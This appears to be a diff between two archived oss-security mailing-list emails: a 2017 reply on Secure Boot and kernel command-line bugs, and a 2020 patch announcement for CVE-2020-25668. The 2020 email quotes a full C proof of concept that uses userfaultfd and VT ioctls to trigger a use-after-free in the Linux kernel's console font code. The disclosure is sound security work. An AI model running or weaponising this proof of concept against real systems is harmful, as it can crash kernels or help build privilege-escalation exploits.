@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1465" "Saturday" "3" "June" "2017" "12:06:23" "+0200" "Florian Weimer" "fweimer@redhat.com" "<06202a69-0da3-68fa-a2b3-6a10c1599014@redhat.com>" "29" "Re: [oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function" "^Date:" nil nil "6" "2017060310:06:23" "[oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function" (number mark "        fweimer@redh Jun  3   29/1465  " thread-indent "\"Re: [oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function\"\n") "<20170530165015.GA4884@openwall.com>" ("<EBDB967B-92F8-47B9-AC79-CBF338A835F2@gmail.com>" "<20170530114138.jpcppn4j67niqhyb@perpetual.pseudorandom.co.uk>" "<d522fd07-7916-48a4-270c-933ffacddb98@redhat.com>" "<CA+DvKQ+TfTcK79YgeMZorvpG38HP8zAeB=gioL6xUVDPyn7Ghg@mail.gmail.com>" "<CANO=Ty2tYv6KAjgrN3fL_YisPSMHQqpSWagEwA+T2Rz15-wGDQ@mail.gmail.com>" "<20170530165015.GA4884@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5459" "Wednesday" "4" "November" "2020" "14:47:49" "+0800" "Minh Yuan" "yuanmingbuaa@gmail.com" "<CAH5WSp4YD2pfY+ZEqOpZ48N5sxtcn+aC2+27bNp4EFZZLVUhnw@mail.gmail.com>" "176" "[oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt" nil nil nil "11" "2020110406:47:49" "[oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt" (number mark "U       yuanmingbuaa Nov  4  176/5459  " thread-indent "\"[oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt\"\n") "<CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>" ("<CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>") nil nil nil nil nil nil nil "[oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 32006 invoked by uid 550); 3 Jun 2017 10:06:38 -0000
+Received: (qmail 5174 invoked by uid 550); 4 Nov 2020 11:10:29 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,60 +11,219 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 31977 invoked from network); 3 Jun 2017 10:06:38 -0000
-DMARC-Filter: OpenDMARC Filter v1.3.2 mx1.redhat.com 926904E4CB
-Authentication-Results: ext-mx09.extmail.prod.ext.phx2.redhat.com; dmarc=none (p=none dis=none) header.from=redhat.com
-Authentication-Results: ext-mx09.extmail.prod.ext.phx2.redhat.com; spf=pass smtp.mailfrom=fweimer@redhat.com
-DKIM-Filter: OpenDKIM Filter v2.11.0 mx1.redhat.com 926904E4CB
-References: <EBDB967B-92F8-47B9-AC79-CBF338A835F2@gmail.com>
- <20170530114138.jpcppn4j67niqhyb@perpetual.pseudorandom.co.uk>
- <d522fd07-7916-48a4-270c-933ffacddb98@redhat.com>
- <CA+DvKQ+TfTcK79YgeMZorvpG38HP8zAeB=gioL6xUVDPyn7Ghg@mail.gmail.com>
- <CANO=Ty2tYv6KAjgrN3fL_YisPSMHQqpSWagEwA+T2Rz15-wGDQ@mail.gmail.com>
- <20170530165015.GA4884@openwall.com>
-Message-ID: <06202a69-0da3-68fa-a2b3-6a10c1599014@redhat.com>
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
- Thunderbird/52.1.0
-MIME-Version: 1.0
-In-Reply-To: <20170530165015.GA4884@openwall.com>
-Content-Type: text/plain; charset=utf-8
-Content-Language: en-US
-Content-Transfer-Encoding: 8bit
-X-Scanned-By: MIMEDefang 2.79 on 10.5.11.12
-X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.38]); Sat, 03 Jun 2017 10:06:25 +0000 (UTC)
-Date: Sat, 3 Jun 2017 12:06:23 +0200
-From: Florian Weimer <fweimer@redhat.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Linux kernel: stack buffer overflow with
- controlled payload in get_options() function
+Received: (qmail 5457 invoked from network); 4 Nov 2020 06:48:37 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
+         :cc;
+        bh=tCVpaBaldGBR22M0hhIMxR3E8iSWshKcJXV+Wm21NDU=;
+        b=CHm5I70yzNkMbHdJM136QGeUrjvDyvwl7SqS+JzmYvWbNFCpceZCTD8eugasA1b796
+         bma/uOBeJYZCDFRbBIQVnTLkHHoxpK6EUbd3YfsfINgzzSZ/uYKaIXakgFM9V5IT4mDj
+         PTD+debQx15TjIGXZyttJG74e3IUP6YnJ+khcUX7U8pWFxwuzFEHaJvdVxZkYj5BHEfh
+         sIvN/7rQw3HBMK2GXkyhzoBEbhr8CRbvVc3NBZB5yITQbUlP5oUUQY0xGyEnY5zPcuf3
+         r80eNIYoHFVIzEVj0ucaAPgbKnhJIjRKRtrQ+e0VmN/0sYYqMqz5flSwM9EW5I89xrUR
+         poqw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to:cc;
+        bh=tCVpaBaldGBR22M0hhIMxR3E8iSWshKcJXV+Wm21NDU=;
+        b=a3ts9IPL+0becEYLx4XOc/ZHIXXvm5M+9hnPr0imotYCVocRZ27v7lXg8so5YMqByH
+         BIlhUxI9ZdP50gumw1MuVDc+JST3sqifUWyImTHlmXXHHhC2J7YwpVyEumWUd+fYKKfj
+         k32VpjjhP2q0gRTzacV4zw1H24JrSDwzfcrTB/vmzZfhXJQsYwVdARl8NJMPLicq7G2j
+         XoZpqM5n65+dHIJ/KAWFKc1F6IgQOddqGGQg/hYwCnbY0hMApln0hqqnon3uPjFUs+Cg
+         Mx4X80fdCZApbmd+GDT+l9vbCnA5XH8FNTpMgzeT3ydYzNXBvwvtvyl1ipT4H5AlaqGS
+         GKEg==
+X-Gm-Message-State: AOAM531wF83aYBX4ZtmjRtsXEPUe6LZh8tylBAuajIfQzQ99DJ5g0/oL
+	5kFi8bWGbVfvRse/nN6GzkkmAM9hvnc735ciMYvVCVJZeEkxZw==
+X-Google-Smtp-Source: ABdhPJxKql0tVRifBwkM+PSKy4Cuh267GwnM3TAgXTrqGd+KsCugnyO5qxwR1qqzReEoCymxQFXW3FU6j0gM7f491Q0=
+X-Received: by 2002:a17:906:6702:: with SMTP id a2mr22988448ejp.309.1604472505850;
+ Tue, 03 Nov 2020 22:48:25 -0800 (PST)
+MIME-Version: 1.0
+References: <CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>
+In-Reply-To: <CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>
+From: Minh Yuan <yuanmingbuaa@gmail.com>
+Date: Wed, 4 Nov 2020 14:47:49 +0800
+Message-ID: <CAH5WSp4YD2pfY+ZEqOpZ48N5sxtcn+aC2+27bNp4EFZZLVUhnw@mail.gmail.com>
 To: oss-security@lists.openwall.com
+Cc: nopitydays@gmail.com
+Content-Type: multipart/alternative; boundary="000000000000c3621105b3425d6d"
+Subject: [oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt
 
-On 05/30/2017 06:50 PM, Solar Designer wrote:
-> I guess Daniel might be associating the other side's arguments with Red
-> Hat's because Florian was posting from a redhat.com address.  I have no
-> idea whether Florian actually spoke on behalf of Red Hat or not, but
+--000000000000c3621105b3425d6d
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-I'm not a Red Hat spokesperson, and I did not speak for Red Hat.  I hope
-I don't have to include a silly disclaimer in every message to counter
-such assumptions.
+Hi all,
 
-> either way I think the focus on Red Hat is excessive - e.g., in the
-> distros list thread on the previous issue, another distro vendor
-> inquired about the proposed public disclosure date, implying they also
-> might care.  A better summary would be: understanding & opinions vary.
+the patch (commit 90bfdeef83f1d6c696039b6a917190dcbbad3220) for this issue
+is available now.
 
-Right, I think those distributions that strive to boot under the
-Microsoft trust root for UEFI Secure Boot may also have concerns about
-this issue.  Part of the problem with UEFI Secure Boot is that no one
-has documented clear security objectives for UEFI Secure Boot.  Fedora
-sort of evolved into “no unsigned code running in ring 0 without
-virtualization”.  From what I can tell, Microsoft picked that up and
-urged other distributions under their trust root to implement that as well.
+https://github.com/torvalds/linux/commit/90bfdeef83f1d6c696039b6a917190dcbb=
+ad3220
 
-If restricted access to ring 0 is the goal (and I think it currently
-is), then Linux kernel command line parsing bugs exploitable for code
-execution can be used to bypass an intended security policy, and
-qualifies as a security vulnerability.
+Regards,
 
-Thanks,
-Florian
+Yuan Ming
+
+Minh Yuan <yuanmingbuaa@gmail.com> =E4=BA=8E2020=E5=B9=B410=E6=9C=8830=E6=
+=97=A5=E5=91=A8=E4=BA=94 =E4=B8=8B=E5=8D=882:29=E5=86=99=E9=81=93=EF=BC=9A
+
+> Hi,
+>
+> We recently discovered a uaf read in *con_font_op* in the latest kernel
+> (v5.9.2 for now). The root cause of this vulnerability is that there exis=
+ts
+> a race in the global variable "*fg_console*", and the commit ca4463bf
+> <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commi=
+t/?id=3Dca4463bf8438b403596edd0ec961ca0d4fbe0220> can't
+> handle this issue.
+>
+> Specifically, after obtaining "vc_cons[fg_console]" by call
+> *do_fontx_ioctl*, we can use *ioctl$VT_ACTIVATE* to change "fg_console"
+> and use *ioctl$VT_DISALLOCATE* to free the old "vc_cons[fg_console]"
+> obtained in  *do_fontx_ioctl*. As a result, the access to vc in
+> *con_font_op* will cause a uaf.
+>
+>
+> To reproduce this concurrency bug stably, I use "userfaultfd" to handle
+> the order of "free" and "use". This is my PoC (it needs the privilege to
+> access tty to trigger this bug.) :
+>
+> // author by ziiiro@thu
+> #include <sys/types.h>
+> #include <sys/stat.h>
+> #include <fcntl.h>
+> #include <sys/ioctl.h>
+> #include <linux/kd.h>
+> #include <linux/vt.h>
+> #include <string.h>
+> #include <sys/types.h>
+> #include <sys/stat.h>
+> #include <sys/mman.h>
+> #include <pthread.h>
+> #include <errno.h>
+> #include <stdlib.h>
+> #include <signal.h>
+> #include <sys/syscall.h>
+> #include <linux/userfaultfd.h>
+> #include <poll.h>
+> #include <linux/prctl.h>
+> #include <stdint.h>
+> #include <unistd.h>
+>
+> #define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
+>                        } while (0)
+> int fd;
+> static int page_size;
+>
+> static void *fault_handler_thread(void *arg) {
+>   unsigned long value;
+>   static struct uffd_msg msg;
+>   long uffd;
+>   static char *page =3D NULL;
+>   struct uffdio_copy uffdio_copy;
+>   int len, i;
+>   if (page =3D=3D NULL) {
+>     page =3D mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+>                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+>     if (page =3D=3D MAP_FAILED) errExit("mmap (userfaultfd)");
+>   }
+>   uffd =3D (long)arg;
+>
+>   for(;;) {
+>     struct pollfd pollfd;
+>     pollfd.fd =3D uffd;
+>     pollfd.events =3D POLLIN;
+>     len =3D poll(&pollfd, 1, -1);
+>
+>
+>     read(uffd, &msg, sizeof(msg));
+>     printf("    flags =3D 0x%lx\n", msg.arg.pagefault.flags);
+>     printf("    address =3D 0x%lx\n", msg.arg.pagefault.address);
+>    // change fg_console to 13
+>     ioctl(fd, VT_ACTIVATE, 13);
+>     ioctl(fd, VT_DISALLOCATE, 0);
+>     // return to kernel-land
+>     uffdio_copy.src =3D (unsigned long)page;
+>     uffdio_copy.dst =3D (unsigned long)msg.arg.pagefault.address &
+> ~(page_size - 1);
+>     uffdio_copy.len =3D page_size;
+>     uffdio_copy.mode =3D 0;
+>     uffdio_copy.copy =3D 0;
+>     if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) =3D=3D -1)
+>         errExit("ioctl: UFFDIO_COPY");
+>
+>   }
+> }
+>
+> void setup_pagefault(void *addr, unsigned size) {
+>   long uffd;
+>   pthread_t th;
+>   struct uffdio_api uffdio_api;
+>   struct uffdio_register uffdio_register;
+>   int s;
+>   // new userfaulfd
+>
+>   uffd =3D syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+>   if (uffd =3D=3D -1) errExit("userfaultfd");
+>   // enabled uffd object
+>   uffdio_api.api =3D UFFD_API;
+>   uffdio_api.features =3D 0;
+>   if (ioctl(uffd, UFFDIO_API, &uffdio_api) =3D=3D -1) errExit("ioctl:
+> UFFDIO_API");
+>   // register memory address
+>   uffdio_register.range.start =3D (unsigned long)addr;
+>   uffdio_register.range.len   =3D size;
+>   uffdio_register.mode        =3D UFFDIO_REGISTER_MODE_MISSING;
+>   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) =3D=3D -1)
+> errExit("ioctl: UFFDIO_REGITER");
+>   // monitor page fault
+>   s =3D pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
+>   if (s !=3D 0) errExit("pthread_create");
+> }
+>
+>
+> int main(int argc, char *argv[])
+> {
+>     fd =3D open("/dev/tty1", O_RDWR);
+>     struct consolefontdesc cfdarg;
+>     page_size =3D sysconf(_SC_PAGE_SIZE);
+>     void *addr =3D (void*)mmap((void*)0x233000,
+>                         page_size * 2,
+>                         PROT_READ | PROT_WRITE,
+>                         MAP_FIXED | MAP_PRIVATE | MAP_ANON,
+>                         -1, 0);
+>     if ((unsigned long)addr !=3D 0x233000)
+>         errExit("mmap (0x233000)");
+>
+>     setup_pagefault(addr, page_size);
+>     cfdarg.charcount =3D 256;
+>     cfdarg.charheight =3D 8;
+>     cfdarg.chardata =3D addr;
+>     // change fg_console to 10
+>     ioctl(fd, VT_ACTIVATE, 10);
+>     ioctl(fd, PIO_FONTX, &cfdarg);
+>
+>     return 0;
+> }
+>
+> I change "fg_console" to *10* and *13* respectively, you can change it to
+> any other appropriate number.
+>
+> In addition to "con_font_op", I think other functions that read or write
+> vc_cons[fg_console]  will also have the same issue.
+>
+> Timeline:
+> * 10.23.20 - Vulnerability reported to security@kernel.org and
+> linux-distros@vs.openwall.org.
+> * 10.27.20 - CVE-2020-25668 assigned.
+> * 10.30.20 - Vulnerability opened.
+>
+> Regards,
+>
+> Yuan Ming, Bodong Zhao from Tsinghua University
+>
+
+--000000000000c3621105b3425d6d--
